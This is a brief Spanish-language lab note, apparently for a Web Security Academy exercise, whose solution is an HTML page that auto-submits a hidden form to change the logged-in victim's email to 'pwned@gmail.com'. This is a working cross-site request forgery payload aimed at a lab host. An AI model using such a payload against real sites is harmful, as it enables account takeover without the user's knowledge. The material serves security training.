## Objetivo:

![[Pasted image 20240515223118.png]]


## Solucion:

![[Pasted image 20240515225248.png]]

```
<body>

<form action="https://0a9e008a032cf45183a6e28f00db0054.web-security-academy.net/my-account/change-email" method="get">

<input type="hidden" name="email" value="pwned@gmail.com" />

</form>

<script>

document.forms[0].submit()

</script>

</body>
```
